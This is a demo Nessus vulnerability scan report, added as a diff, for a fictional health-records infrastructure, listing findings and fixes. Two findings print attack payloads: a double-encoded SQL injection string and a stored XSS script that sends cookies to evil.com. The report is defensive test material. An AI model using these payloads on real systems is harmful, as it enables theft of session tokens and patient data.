@@ -1,0 +1,487 @@
+<?xml version="1.0" ?>
+<NessusClientData_v2>
+  <Policy>
+    <policyName>ForgeComply360 Demo - PHS MFEHR Credentialed Scan</policyName>
+  </Policy>
+  <Report name="PHS MedForge EHR Infrastructure Scan - 2026-02-18">
+    <!-- ================================================================ -->
+    <!-- HOST 1: mfehr-db-primary (PostgreSQL - PHI Database) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.3.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.3.10</tag>
+        <tag name="host-fqdn">mfehr-db-primary.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-db-primary</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:03:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 02:00:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 02:45:00 2026</tag>
+      </HostProperties>
+
+      <!-- Critical: Log4Shell -->
+      <ReportItem port="0" svc_name="general" protocol="tcp" severity="4" pluginID="156032" pluginName="Apache Log4j &lt; 2.17.1 Remote Code Execution (Log4Shell)" pluginFamily="Misc.">
+        <description>The database monitoring agent on the remote host uses Apache Log4j version 2.14.1 which is vulnerable to CVE-2021-44228 (Log4Shell). This vulnerability allows unauthenticated remote code execution via JNDI injection through specially crafted log messages. The database monitoring agent processes external input from application health checks, creating an attack vector.</description>
+        <synopsis>A critical remote code execution vulnerability exists in the Log4j library used by the database monitoring agent.</synopsis>
+        <solution>Immediately upgrade Log4j to version 2.17.1 or later. As interim mitigation, set the system property log4j2.formatMsgNoLookups=true.</solution>
+        <cvss_base_score>10.0</cvss_base_score>
+        <cvss3_base_score>9.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</cvss3_vector>
+        <cve>CVE-2021-44228</cve>
+        <plugin_output>Vulnerable library: /opt/db-monitor/lib/log4j-core-2.14.1.jar
+Application: PostgreSQL Monitoring Agent v3.2.1
+formatMsgNoLookups: not set</plugin_output>
+        <exploit_available>true</exploit_available>
+        <see_also>https://logging.apache.org/log4j/2.x/security.html</see_also>
+        <plugin_publication_date>2021/12/10</plugin_publication_date>
+      </ReportItem>
+
+      <!-- High: Missing Critical Kernel Patches -->
+      <ReportItem port="0" svc_name="general" protocol="tcp" severity="3" pluginID="170045" pluginName="Amazon Linux 2023 Missing Kernel Security Updates" pluginFamily="Amazon Linux Local Security Checks">
+        <description>The remote Amazon Linux 2023 host is missing critical kernel security updates. The installed kernel is 45 days behind the latest security release, which includes fixes for local privilege escalation vulnerabilities.</description>
+        <synopsis>The remote host is missing critical kernel security patches.</synopsis>
+        <solution>Run 'dnf update kernel' to apply the latest kernel security updates. Schedule regular patching via AWS Systems Manager Patch Manager.</solution>
+        <cvss_base_score>7.8</cvss_base_score>
+        <cvss3_base_score>7.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <cve>CVE-2024-50302</cve>
+        <plugin_output>Installed: kernel-6.1.56-82.125.amzn2023
+Available: kernel-6.1.72-99.168.amzn2023
+Days since last patch: 45</plugin_output>
+        <exploit_available>false</exploit_available>
+      </ReportItem>
+
+      <!-- Medium: PostgreSQL Unpatched -->
+      <ReportItem port="5432" svc_name="postgresql" protocol="tcp" severity="2" pluginID="170046" pluginName="PostgreSQL 15.x &lt; 15.6 Multiple Vulnerabilities" pluginFamily="Databases">
+        <description>The PostgreSQL installation on the remote host is version 15.4 and is affected by multiple vulnerabilities including SQL injection via certain extension functions and information disclosure through error messages.</description>
+        <synopsis>The remote PostgreSQL installation is out of date.</synopsis>
+        <solution>Upgrade PostgreSQL to version 15.6 or later.</solution>
+        <cvss_base_score>5.3</cvss_base_score>
+        <cvss3_base_score>5.3</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N</cvss3_vector>
+        <cve>CVE-2024-0985</cve>
+        <plugin_output>Installed: PostgreSQL 15.4
+Required: PostgreSQL 15.6</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 2: mfehr-api-01 (Node.js API Server) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.2.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.2.10</tag>
+        <tag name="host-fqdn">mfehr-api-01.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-api-01</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:02:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 02:45:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 03:30:00 2026</tag>
+      </HostProperties>
+
+      <!-- Critical: SQL Injection -->
+      <ReportItem port="3000" svc_name="www" protocol="tcp" severity="4" pluginID="170047" pluginName="Web Application SQL Injection (Double URL Encoding Bypass)" pluginFamily="CGI abuses">
+        <description>The web application on the remote host is vulnerable to SQL injection via double URL-encoded characters in the /api/v2/patients/search endpoint. The last_name parameter can be exploited to bypass parameterized query protections and directly inject SQL commands, potentially exposing PHI for all 2.3 million veteran patients.</description>
+        <synopsis>A critical SQL injection vulnerability exists in the patient search API.</synopsis>
+        <solution>Implement prepared statements with strict parameterized queries. Add a secondary input validation layer that decodes and sanitizes URL-encoded input before processing. Deploy WAF rules to block double-encoded characters.</solution>
+        <cvss_base_score>9.1</cvss_base_score>
+        <cvss3_base_score>9.1</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</cvss3_vector>
+        <plugin_output>Endpoint: /api/v2/patients/search
+Parameter: last_name
+Payload: %2527%2520OR%25201%253D1--
+Response: 200 OK (returned 2,347,891 records)
+Application: MFEHR API v2.4.1</plugin_output>
+        <exploit_available>true</exploit_available>
+      </ReportItem>
+
+      <!-- Medium: Missing Rate Limiting -->
+      <ReportItem port="3000" svc_name="www" protocol="tcp" severity="2" pluginID="170048" pluginName="Web Application Authentication Endpoint Lacks Rate Limiting" pluginFamily="CGI abuses">
+        <description>The authentication endpoint /api/v2/auth/login on the remote host does not implement rate limiting. An attacker could perform unlimited authentication attempts to brute-force user credentials.</description>
+        <synopsis>Authentication endpoint lacks rate limiting protection.</synopsis>
+        <solution>Implement rate limiting: max 5 attempts per account per 15-minute window. Add account lockout after 10 failed attempts. Implement CAPTCHA after 3 consecutive failures.</solution>
+        <cvss_base_score>5.3</cvss_base_score>
+        <cvss3_base_score>5.3</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Endpoint: /api/v2/auth/login
+Rate Limit: None detected
+Test: 100 requests in 10 seconds - all processed</plugin_output>
+      </ReportItem>
+
+      <!-- Low: Server Header Disclosure -->
+      <ReportItem port="3000" svc_name="www" protocol="tcp" severity="1" pluginID="170049" pluginName="Node.js Express Server Version Disclosure" pluginFamily="Web Servers">
+        <description>The web server on the remote host discloses framework information via the X-Powered-By response header.</description>
+        <synopsis>The web application discloses framework information.</synopsis>
+        <solution>Disable the X-Powered-By header in Express: app.disable('x-powered-by').</solution>
+        <cvss_base_score>2.6</cvss_base_score>
+        <cvss3_base_score>2.6</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>X-Powered-By: Express</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 3: mfehr-web-01 (NGINX Web Server) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.1.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.1.10</tag>
+        <tag name="host-fqdn">mfehr-web-01.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-web-01</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:01:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 03:30:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 04:00:00 2026</tag>
+      </HostProperties>
+
+      <!-- High: TLS 1.0/1.1 Enabled -->
+      <ReportItem port="443" svc_name="https" protocol="tcp" severity="3" pluginID="170050" pluginName="SSL/TLS Deprecated Protocol Version Supported (TLS 1.0/1.1)" pluginFamily="General">
+        <description>The remote host supports TLS 1.0 and TLS 1.1, which are deprecated protocols with known vulnerabilities including POODLE and BEAST attacks. FedRAMP requires TLS 1.2 as the minimum supported version.</description>
+        <synopsis>Deprecated TLS versions are enabled on the remote host.</synopsis>
+        <solution>Modify NGINX ssl_protocols directive: ssl_protocols TLSv1.2 TLSv1.3; Update ssl_ciphers to use only FIPS-approved cipher suites.</solution>
+        <cvss_base_score>7.4</cvss_base_score>
+        <cvss3_base_score>7.4</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</cvss3_vector>
+        <plugin_output>Supported protocols:
+  TLSv1.0 (DEPRECATED)
+  TLSv1.1 (DEPRECATED)
+  TLSv1.2
+  TLSv1.3
+NGINX Version: 1.24.0</plugin_output>
+        <exploit_available>true</exploit_available>
+      </ReportItem>
+
+      <!-- Low: NGINX Version Disclosure -->
+      <ReportItem port="443" svc_name="https" protocol="tcp" severity="1" pluginID="170051" pluginName="HTTP Server Type and Version" pluginFamily="Web Servers">
+        <description>The remote NGINX web server includes version information in the Server response header.</description>
+        <synopsis>Web server version is disclosed.</synopsis>
+        <solution>Add server_tokens off; to NGINX configuration.</solution>
+        <cvss_base_score>3.1</cvss_base_score>
+        <cvss3_base_score>3.1</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Server: nginx/1.24.0</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 4: mfehr-web-02 (NGINX Web Server - HA) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.1.11">
+      <HostProperties>
+        <tag name="host-ip">10.100.1.11</tag>
+        <tag name="host-fqdn">mfehr-web-02.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-web-02</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:01:01:02</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 04:00:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 04:30:00 2026</tag>
+      </HostProperties>
+
+      <!-- High: Same TLS issue on second web server -->
+      <ReportItem port="443" svc_name="https" protocol="tcp" severity="3" pluginID="170050" pluginName="SSL/TLS Deprecated Protocol Version Supported (TLS 1.0/1.1)" pluginFamily="General">
+        <description>The remote host supports TLS 1.0 and TLS 1.1 deprecated protocols.</description>
+        <synopsis>Deprecated TLS versions enabled.</synopsis>
+        <solution>Disable TLS 1.0/1.1 in NGINX configuration.</solution>
+        <cvss_base_score>7.4</cvss_base_score>
+        <cvss3_base_score>7.4</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</cvss3_vector>
+        <plugin_output>TLSv1.0: Enabled; TLSv1.1: Enabled; NGINX 1.24.0</plugin_output>
+        <exploit_available>true</exploit_available>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 5: mfehr-esb-mulesoft (Integration Layer) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.5.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.5.10</tag>
+        <tag name="host-fqdn">mfehr-esb-mulesoft.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-esb-mulesoft</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:05:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 04:30:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 05:00:00 2026</tag>
+      </HostProperties>
+
+      <!-- High: MuleSoft Authentication Bypass -->
+      <ReportItem port="8081" svc_name="http-proxy" protocol="tcp" severity="3" pluginID="170052" pluginName="MuleSoft Anypoint API Gateway Authentication Policy Bypass" pluginFamily="CGI abuses">
+        <description>The MuleSoft Anypoint API Gateway on the remote host has a misconfigured authentication policy on the HL7 FHIR message transformation endpoint. The endpoint allows unauthenticated access from within the VPC, enabling potential submission of malformed HL7 messages to the EHR database.</description>
+        <synopsis>MuleSoft API gateway allows unauthenticated access to a sensitive endpoint.</synopsis>
+        <solution>Apply client_id enforcement policy to all API endpoints. Implement mutual TLS for service-to-service communication. Add HL7 message schema validation at the API gateway level.</solution>
+        <cvss_base_score>8.1</cvss_base_score>
+        <cvss3_base_score>8.1</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</cvss3_vector>
+        <plugin_output>Endpoint: /api/fhir/transform
+Authentication: None required
+Platform: MuleSoft Anypoint 4.4.0
+Accessible from: 10.100.0.0/16 (VPC CIDR)</plugin_output>
+      </ReportItem>
+
+      <!-- Medium: Java Runtime Outdated -->
+      <ReportItem port="0" svc_name="general" protocol="tcp" severity="2" pluginID="170053" pluginName="Oracle Java Runtime Environment Outdated" pluginFamily="Misc.">
+        <description>The Java Runtime Environment on the remote host is version 11.0.20 and is missing security updates.</description>
+        <synopsis>The Java runtime is out of date.</synopsis>
+        <solution>Update JRE to the latest version: Java 11.0.22 or later.</solution>
+        <cvss_base_score>5.3</cvss_base_score>
+        <cvss3_base_score>5.3</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Installed: Java 11.0.20
+Available: Java 11.0.22</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 6: mfehr-cache-01 (Redis) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.4.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.4.10</tag>
+        <tag name="host-fqdn">mfehr-cache-01.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-cache-01</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:04:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 05:00:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 05:20:00 2026</tag>
+      </HostProperties>
+
+      <!-- Medium: Redis Without Authentication -->
+      <ReportItem port="6379" svc_name="redis" protocol="tcp" severity="2" pluginID="170054" pluginName="Redis Server Without Authentication" pluginFamily="Databases">
+        <description>The Redis server on the remote host does not require authentication. While network-level controls restrict access to application servers within the VPC, defense in depth requires Redis AUTH to be enabled.</description>
+        <synopsis>Redis authentication is not configured.</synopsis>
+        <solution>Enable Redis AUTH with a strong password stored in AWS Secrets Manager. Rotate the password quarterly. Configure ACL rules for granular access control.</solution>
+        <cvss_base_score>5.9</cvss_base_score>
+        <cvss3_base_score>5.9</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</cvss3_vector>
+        <plugin_output>Redis Version: 7.0.15
+AUTH Required: No
+ACL Configured: No
+Accessible from: VPC internal only</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 7: mfehr-lb-ext (ALB) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.0.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.0.10</tag>
+        <tag name="host-fqdn">mfehr-lb-ext.patriothealth.internal</tag>
+        <tag name="hostname">mfehr-lb-ext</tag>
+        <tag name="operating-system">AWS ALB</tag>
+        <tag name="Credentialed_Scan">false</tag>
+        <tag name="HOST_START">Wed Feb 18 05:20:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 05:35:00 2026</tag>
+      </HostProperties>
+
+      <!-- Medium: Health Check Info Disclosure -->
+      <ReportItem port="443" svc_name="https" protocol="tcp" severity="2" pluginID="170055" pluginName="Web Application Health Check Information Disclosure" pluginFamily="CGI abuses">
+        <description>The /health endpoint on the ALB returns detailed application version, framework, and database driver information in the response body, potentially aiding attacker reconnaissance.</description>
+        <synopsis>Health check endpoint exposes internal version information.</synopsis>
+        <solution>Modify health check to return HTTP 200 with no body. Move detailed health info to an authenticated /admin/health endpoint.</solution>
+        <cvss_base_score>4.3</cvss_base_score>
+        <cvss3_base_score>4.3</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Endpoint: /health
+Response: {"version":"2.4.1","node":"18.19.0","pg":"8.11.3","uptime":847293}</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 8: phs-bastion-01 (Bastion Host) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.0.50">
+      <HostProperties>
+        <tag name="host-ip">10.100.0.50</tag>
+        <tag name="host-fqdn">phs-bastion-01.patriothealth.internal</tag>
+        <tag name="hostname">phs-bastion-01</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:00:05:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 05:35:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 06:00:00 2026</tag>
+      </HostProperties>
+
+      <!-- High: Critical Patches Missing -->
+      <ReportItem port="0" svc_name="general" protocol="tcp" severity="3" pluginID="170056" pluginName="Amazon Linux 2023 Missing Critical Security Patches (7 Updates)" pluginFamily="Amazon Linux Local Security Checks">
+        <description>The remote host is missing 7 critical Amazon Linux security patches including kernel privilege escalation fixes. Last patched 45 days ago, exceeding the 30-day organizational patch SLA.</description>
+        <synopsis>The bastion host is missing critical security patches.</synopsis>
+        <solution>Apply all pending security patches: dnf update --security. Configure AWS SSM Patch Manager for automated patching within maintenance windows.</solution>
+        <cvss_base_score>7.8</cvss_base_score>
+        <cvss3_base_score>7.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <plugin_output>Missing patches: 7 critical, 3 important
+Last patched: 2026-01-04
+Days since last patch: 45
+Patch SLA: 30 days (EXCEEDED)</plugin_output>
+        <exploit_available>false</exploit_available>
+      </ReportItem>
+
+      <!-- Low: SSH Weak Key Exchange Algorithms -->
+      <ReportItem port="22" svc_name="ssh" protocol="tcp" severity="1" pluginID="170057" pluginName="SSH Server Weak Key Exchange Algorithms" pluginFamily="Misc.">
+        <description>The SSH server supports weak key exchange algorithms including diffie-hellman-group14-sha1.</description>
+        <synopsis>Weak SSH key exchange algorithms are supported.</synopsis>
+        <solution>Update sshd_config to use only strong key exchange: KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512</solution>
+        <cvss_base_score>3.7</cvss_base_score>
+        <cvss3_base_score>3.7</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Weak algorithms: diffie-hellman-group14-sha1</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 9: scpp-api-01 (Patient Portal API) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.6.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.6.10</tag>
+        <tag name="host-fqdn">scpp-api-01.patriothealth.internal</tag>
+        <tag name="hostname">scpp-api-01</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:06:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 06:00:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 06:30:00 2026</tag>
+      </HostProperties>
+
+      <!-- High: Stored XSS -->
+      <ReportItem port="3000" svc_name="www" protocol="tcp" severity="3" pluginID="170058" pluginName="Stored Cross-Site Scripting (XSS) in Patient Messaging" pluginFamily="CGI abuses">
+        <description>The patient messaging feature does not sanitize HTML content in message bodies. Stored XSS is possible when a patient submits a message containing JavaScript that executes when viewed by a healthcare provider, potentially exfiltrating session tokens or PHI.</description>
+        <synopsis>Stored XSS vulnerability in patient messaging feature.</synopsis>
+        <solution>Implement server-side HTML sanitization using DOMPurify. Add Content-Security-Policy headers. Enable HttpOnly flag on all session cookies.</solution>
+        <cvss_base_score>7.1</cvss_base_score>
+        <cvss3_base_score>7.1</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N</cvss3_vector>
+        <plugin_output>Endpoint: /api/v1/messages
+Payload: &lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;
+Result: Script stored and rendered in provider view</plugin_output>
+        <exploit_available>true</exploit_available>
+      </ReportItem>
+
+      <!-- Medium: Missing CSP -->
+      <ReportItem port="3000" svc_name="www" protocol="tcp" severity="2" pluginID="170059" pluginName="Content Security Policy (CSP) Not Configured" pluginFamily="CGI abuses">
+        <description>The web application does not implement Content Security Policy headers, increasing the risk of XSS and data injection attacks.</description>
+        <synopsis>Missing Content Security Policy headers.</synopsis>
+        <solution>Configure CSP headers: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'.</solution>
+        <cvss_base_score>5.0</cvss_base_score>
+        <cvss3_base_score>5.0</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</cvss3_vector>
+        <plugin_output>Content-Security-Policy header: Not present</plugin_output>
+      </ReportItem>
+
+      <!-- Low: Missing X-Content-Type-Options -->
+      <ReportItem port="3000" svc_name="www" protocol="tcp" severity="1" pluginID="170060" pluginName="Missing X-Content-Type-Options Header" pluginFamily="CGI abuses">
+        <description>API responses do not include X-Content-Type-Options: nosniff header.</description>
+        <synopsis>Missing X-Content-Type-Options header.</synopsis>
+        <solution>Add X-Content-Type-Options: nosniff to all API responses.</solution>
+        <cvss_base_score>2.6</cvss_base_score>
+        <cvss3_base_score>2.6</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>X-Content-Type-Options: Not present</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 10: phs-siem-splunk (Splunk SIEM) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.9.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.9.10</tag>
+        <tag name="host-fqdn">phs-siem-splunk.patriothealth.internal</tag>
+        <tag name="hostname">phs-siem-splunk</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:09:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 06:30:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 06:45:00 2026</tag>
+      </HostProperties>
+
+      <!-- Medium: Splunk UF Outdated -->
+      <ReportItem port="8089" svc_name="splunkd" protocol="tcp" severity="2" pluginID="170061" pluginName="Splunk Universal Forwarder Outdated Version" pluginFamily="Misc.">
+        <description>The Splunk Universal Forwarder is version 9.0.3, which is 2 major versions behind the current release. While no critical CVEs exist for this version, maintaining current software is required by CM-3.</description>
+        <synopsis>Splunk Universal Forwarder is outdated.</synopsis>
+        <solution>Upgrade Splunk Universal Forwarder to version 9.2.x. Verify log forwarding after upgrade.</solution>
+        <cvss_base_score>4.5</cvss_base_score>
+        <cvss3_base_score>4.5</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:N/A:H</cvss3_vector>
+        <plugin_output>Installed: Splunk UF 9.0.3
+Current: Splunk UF 9.2.1</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 11: hoap-etl-01 (Analytics ETL) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.8.10">
+      <HostProperties>
+        <tag name="host-ip">10.100.8.10</tag>
+        <tag name="host-fqdn">hoap-etl-01.patriothealth.internal</tag>
+        <tag name="hostname">hoap-etl-01</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:08:01:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 06:45:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 07:00:00 2026</tag>
+      </HostProperties>
+
+      <!-- Medium: Insufficient Logging -->
+      <ReportItem port="0" svc_name="general" protocol="tcp" severity="2" pluginID="170062" pluginName="AWS Glue Job Logging Configuration Insufficient" pluginFamily="Misc.">
+        <description>The ETL Glue jobs on the remote host do not log sufficient detail for security audit trail requirements. Job execution logs lack source data lineage and transformation details required by HIPAA audit requirements.</description>
+        <synopsis>ETL job logging is insufficient for compliance requirements.</synopsis>
+        <solution>Enable detailed Glue job logging. Configure CloudWatch log groups with 365-day retention. Add data lineage tracking to ETL scripts.</solution>
+        <cvss_base_score>4.0</cvss_base_score>
+        <cvss3_base_score>4.0</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L</cvss3_vector>
+        <plugin_output>CloudWatch Log Group: Not configured for detailed logging
+Data lineage tracking: Not implemented</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+    <!-- ================================================================ -->
+    <!-- HOST 12: hoap-warehouse (Redshift/Data Warehouse) -->
+    <!-- ================================================================ -->
+    <ReportHost name="10.100.8.20">
+      <HostProperties>
+        <tag name="host-ip">10.100.8.20</tag>
+        <tag name="host-fqdn">hoap-warehouse.patriothealth.internal</tag>
+        <tag name="hostname">hoap-warehouse</tag>
+        <tag name="operating-system">Amazon Linux 2023</tag>
+        <tag name="mac-address">AA:BB:CC:08:02:01</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="HOST_START">Wed Feb 18 07:00:00 2026</tag>
+        <tag name="HOST_END">Wed Feb 18 07:15:00 2026</tag>
+      </HostProperties>
+
+      <!-- Low: Outdated SSL Certificate Bundle -->
+      <ReportItem port="5439" svc_name="redshift" protocol="tcp" severity="1" pluginID="170063" pluginName="Amazon Redshift Outdated SSL Certificate Bundle" pluginFamily="Databases">
+        <description>The Redshift cluster is using an older AWS SSL certificate bundle (rds-combined-ca-bundle-2019.pem) instead of the current 2024 bundle.</description>
+        <synopsis>Redshift is using an outdated SSL certificate bundle.</synopsis>
+        <solution>Update SSL certificate bundle to rds-combined-ca-bundle-2024.pem. Update JDBC connection strings in ETL jobs.</solution>
+        <cvss_base_score>2.1</cvss_base_score>
+        <cvss3_base_score>2.1</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Current bundle: rds-combined-ca-bundle-2019.pem
+Latest bundle: rds-combined-ca-bundle-2024.pem</plugin_output>
+      </ReportItem>
+
+      <!-- Low: Default Session Timeout (Tableau) -->
+      <ReportItem port="8850" svc_name="www" protocol="tcp" severity="1" pluginID="170064" pluginName="Tableau Server Default Session Timeout" pluginFamily="CGI abuses">
+        <description>The Tableau Server is using the default 240-minute session timeout instead of the organizational requirement of 30 minutes for applications processing health data.</description>
+        <synopsis>Tableau session timeout exceeds organizational policy.</synopsis>
+        <solution>Configure wgserver.session.idle_limit to 30 minutes via TSM CLI. Restart Tableau Server.</solution>
+        <cvss_base_score>3.3</cvss_base_score>
+        <cvss3_base_score>3.3</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N</cvss3_vector>
+        <plugin_output>Current timeout: 240 minutes (default)
+Required timeout: 30 minutes
+Tableau Version: 2023.3</plugin_output>
+      </ReportItem>
+    </ReportHost>
+
+  </Report>
+</NessusClientData_v2>
